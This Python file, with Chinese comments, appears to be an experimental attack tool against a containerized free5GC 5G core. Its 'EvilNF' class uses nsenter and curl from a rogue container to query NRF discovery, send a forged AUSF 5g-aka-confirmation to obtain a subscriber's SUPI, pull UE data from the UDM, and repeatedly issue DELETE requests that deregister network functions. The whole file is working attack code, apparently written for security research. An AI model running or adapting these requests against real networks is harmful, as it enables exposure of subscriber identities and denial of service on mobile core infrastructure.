import subprocess
import time
import json

class EvilNF:
    def __init__(self, evil_nf_name: str):
        # 该evil NF的名字
        self.name = evil_nf_name
        # 该evil NF的PID
        self.pid = subprocess.check_output(
            f"docker inspect --format '{{{{.State.Pid}}}}' $(docker ps -q -f 'label=nf={evil_nf_name}' -f 'name=free5gc*')",
            shell=True
        ).decode().strip()

    def _get_nf_ip(self, nf_name: str):
        output = subprocess.check_output(['kubectl', 'get', 'pods', '-o', 'wide']).decode('utf-8')

        for line in output.split('\n'):
            if nf_name in line:
                ip_address = line.split()[5]
        return ip_address

    def ue_info_get(self, exp_num: int, interval: int):
        # 获取nrf容器的IP
        nrf_ip = self._get_nf_ip('nrf')
        # 构造NRF disc HTTP请求
        nnrf_disc_url = f"http://"+nrf_ip+":8000/nnrf-disc/v1/nf-instances?requester-nf-type=AMF\&target-nf-type=AUSF"
        # 构造进入容器命名空间,并执行 curl 命令发送nnrf-disc HTTP 请求
        nsenter_nnrf_cmd = f"nsenter -u -n -p -t {self.pid} /bin/bash -c '/usr/bin/curl -s {nnrf_disc_url}'"

        # 获取ausf容器的IP
        ausf_ip = self._get_nf_ip('ausf')
        # 构造5g-aka-confirmation请求,以获取SUPI
        nausf_aka_confir_url = "http://"+ausf_ip+":80/nausf-auth/v1/ue-authentications/suci-0-208-93-0000-0-0-0000000003/5g-aka-confirmation"
        data = {"resStar": "attack"}
        data_str = json.dumps(data)
        nsenter_nausf_command = ['nsenter', '-u', '-n', '-p', '-t', str(self.pid), '/bin/bash', '-c', f'/usr/bin/curl -XPUT {nausf_aka_confir_url} -d \'{data_str}\'']

        # 获取udm容器的IP
        udm_ip = self._get_nf_ip('udm')
        # 构造nudm-sdm请求,以获取UE信息
        nudm_nudm_sdm_url = "http://"+udm_ip+":80/nudm-sdm/v1/imsi-208930000000003/am-data?plmn-id=%7B%22mcc%22%3A%22208%22%2C%22mnc%22%3A%2293%22%7D"
        nsenter_nudm_cmd = f"nsenter -u -n -p -t {self.pid} /bin/bash -c '/usr/bin/curl -s '{nudm_nudm_sdm_url}''"

        for _ in range(exp_num):
            # 每次攻击之前停顿几秒
            response_nrf = subprocess.check_output(nsenter_nnrf_cmd, shell=True)
            print(response_nrf.decode())
            nausf_result = subprocess.run(nsenter_nausf_command, capture_output=True)
            print(nausf_result.stdout.decode())
            response_ndm = subprocess.check_output(nsenter_nudm_cmd, shell=True)
            print(response_ndm.decode())
            time.sleep(interval)
            

    def get_registered_nf_list(self):
        # 获取nrf容器的IP
        nrf_ip = self._get_nf_ip('nrf')
        # 构造NRF disc HTTP请求
        nnrf_disc_url = f"http://"+nrf_ip+":8000/nnrf-disc/v1/nf-instances?requester-nf-type=AMF\&target-nf-type=AUSF"
        # 构造进入evil NF容器命名空间,并执行 curl 命令发送nnrf-disc HTTP 请求
        nsenter_nnrf_disc_cmd = f"nsenter -u -n -p -t {self.pid} /bin/bash -c '/usr/bin/curl -s {nnrf_disc_url}'"
        response_nrf_dic = subprocess.check_output(nsenter_nnrf_disc_cmd, shell=True)
        # 将response_nrf_dic转换为json对象
        nrf_disc_json = json.loads(response_nrf_dic)
        # 返回nrf处目前剩余的处于注册状态的ausf instance list
        return nrf_disc_json['nfInstances']

    def evil_delete_nf(self, exp_num: int, interval: int):
        # 获取当前nrf处剩余的处于注册状态的ausf instance list
        ausf_instances = self.get_registered_nf_list()
        # 若剩余的instances数量不够本次实验，返回false，提醒重启ausf
        if len(ausf_instances)/exp_num <= 0:
            return False
        # 否则执行攻击，返回True表示攻击完毕
        else:
            for _ in range(exp_num):
                nfInstanceId = 'attack'
                # 构造NRF nnrf-nfm DELETE HTTP请求
                nnrf_nfm_url = f"http://"+self._get_nf_ip('nrf')+":8000/nnrf-nfm/v1/nf-instances/"+nfInstanceId
                # 构造进入evil NF容器命名空间,并执行 curl 命令发送nnrf-disc HTTP 请求
                nsenter_nnrf_nfm_cmd = f"nsenter -u -n -p -t {self.pid} /bin/bash -c '/usr/bin/curl -s -X DELETE {nnrf_nfm_url}'"
                response_nrf_nfm = subprocess.check_output(nsenter_nnrf_nfm_cmd, shell=True)
                print(response_nrf_nfm.decode('utf-8'))
                # 每次攻击之间停顿几秒
                time.sleep(interval)
            return True
